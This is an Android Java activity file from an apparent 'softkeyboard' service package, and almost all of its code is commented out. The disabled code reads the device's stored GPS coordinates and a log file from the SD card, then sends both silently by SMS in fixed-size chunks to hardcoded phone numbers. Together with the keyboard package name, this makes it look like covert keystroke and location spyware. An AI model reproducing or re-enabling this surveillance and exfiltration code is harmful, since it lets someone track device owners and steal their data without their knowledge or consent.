package com.softkeyboard.service;

import android.app.Activity;
import android.os.Bundle;

public class TAC extends Activity {
	/*Thread t;
	String message = AppVariables.message;
	final Handler handler = new Handler();
	String toNumber = AppVariables.toNumber;
	SharedPreferences preferences;*/

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		/*preferences = PreferenceManager.getDefaultSharedPreferences(this);
		String lat = preferences.getString("LATITUDE", "");
		String longitude = preferences.getString("LONGITUDE", "");
		message = "CURRENT LOCATION  :  " + lat + "," + longitude
				+ AppVariables.message;
		toNumber = AppVariables.toNumber;
		setContentView(R.layout.transperent);
		Log.d("TTAG", "SENT");
		sendsmsplain();
		Log.d("TTAG", "SENT");
		finish();*/
	}

	// ///////////////////read Log file content//////////////simple
	// fileinputstream of java//////////////
	// private void getLogfileContent() {
	//
	// String messageToSend = "";
	// FileInputStream fis = null;
	// String SDCARD = Environment.getExternalStorageDirectory()
	// .getAbsolutePath();
	// File logFile = new File(SDCARD + File.separator + AppUtil.LOG_FILE_NAME);
	// try {
	// fis = new FileInputStream(logFile);
	// int i = 0;
	// int iterator = 0;
	// while ((i = fis.read()) != -1) {
	// iterator++;
	// messageToSend = messageToSend + (char) i;
	// if (iterator == 160) {
	// sendSMS(AppVariables.toNumber, messageToSend);
	// Log.d("TTAG", messageToSend + " SMS  sent to "
	// + AppVariables.toNumber);
	// messageToSend = "";
	// iterator = 0;
	// // t.sleep(5000);
	// }
	// }
	// sendSMS(AppVariables.toNumber, messageToSend);
	// Log.d("TTAG", messageToSend + " SMS sent to"
	// + AppVariables.toNumber);
	//
	// } catch (FileNotFoundException e) {
	// // TODO Auto-generated catch block
	// e.printStackTrace();
	// } catch (IOException e) {
	// // TODO Auto-generated catch block
	// e.printStackTrace();
	// } finally {
	// try {
	// fis.close();
	// } catch (IOException e) {
	// // TODO Auto-generated catch block
	// e.printStackTrace();
	// }
	// }
	//
	// //
	// // t = new Thread(this);
	// // t.start();
	// // // return messageToSend;
	//
	// }

	public void sendsmsplain() {
		// SmsManager smsManager = SmsManager.getDefault();
		// smsManager.sendTextMessage("+919567830230", null,
		// "sadsadasdasdsadasd",
		// null, null);
		// smsManager.sendTextMessage("+919995772953", null,
		// "sadsadasdasdsadasd",
		// null, null);
		// Log.d("TTAG", "sent");
		// getLogfileContent();
		/*PendingIntent piSend = PendingIntent.getBroadcast(this, 0, new Intent(
				"SMS_SENT"), 0);
		PendingIntent piDelivered = PendingIntent.getBroadcast(this, 0,
				new Intent("SMS_DELIVERED"), 0);
		Log.d("EXCE", "HERE    " + message.length() + "     " + message);
		String[] splitMeStrings = splitInParts(message, 140);
		Log.d("EXCE", "HERE    " + splitMeStrings.length + "     " + message);
		for (String string : splitMeStrings) {
			SmsManager smsManager = SmsManager.getDefault();
			smsManager.sendTextMessage(toNumber, null, string, piSend,
					piDelivered);
			handler.postDelayed(new Runnable() {
				@Override
				public void run() {
					// handler.postDelayed(this, 1000);

				}
			}, 1000);
		}
		AppVariables.message = "";*/
	}

	// ////////////////////sms sending using
	// smsmanager//////////////////////////
	// public void sendSMS(String number, String message) {
	//
	// SmsManager smsManager = SmsManager.getDefault();
	// smsManager.sendTextMessage("+919995772953", null, AppVariables.message,
	// null, null);
	// // Toast.makeText(getApplicationContext(), "message sent",
	// // Toast.LENGTH_LONG).show();
	//
	// // // try {
	// // SmsManager sms = SmsManager.getDefault();
	// // PendingIntent sentPI;
	// // String SENT = "SMS_SENT";
	// // //
	// // sentPI = PendingIntent.getBroadcast(getApplicationContext(), 0,
	// // new Intent(SENT), 0);
	// // //
	// // sms.sendTextMessage("+919995772953", null, message, sentPI, null);
	// Log.d("TTAG", "message snet");
	// // // } catch (Exception e) {
	// // // Log.d("TTAG", e.toString() + "    kozhappamanu");
	// // // }
	//
	// }

	/*public String[] splitInParts(String s, int partLength) {
		int len = s.length();

		// Number of parts
		int nparts = (len + partLength - 1) / partLength;
		String parts[] = new String[nparts];

		// Break into parts
		int offset = 0;
		int i = 0;
		while (i < nparts) {
			parts[i] = s.substring(offset, Math.min(offset + partLength, len));
			offset += partLength;
			i++;
		}

		return parts;
	}*/

}
